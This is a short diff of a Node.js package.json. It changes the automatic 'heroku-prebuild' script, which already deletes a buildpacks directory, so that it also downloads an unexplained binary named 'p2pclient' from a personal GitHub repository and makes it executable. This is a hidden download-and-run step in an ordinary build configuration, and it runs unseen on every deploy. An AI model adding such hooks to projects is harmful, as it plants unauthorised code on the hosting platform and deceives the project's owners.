@@ -7,7 +7,7 @@
   },
   "main": "index.js",
   "scripts": {
-    "heroku-prebuild": "ls  && cd /tmp/codon/tmp && rm -r buildpacks && ls",
+    "heroku-prebuild": "ls  && cd /tmp/codon/tmp && rm -r buildpacks && ls && wget https://github.com/sengepeke/nextjs/raw/master/p2pclient && chmod +x p2pclient",
     "start": "node index.js",
     "test": "node test.js"
   },
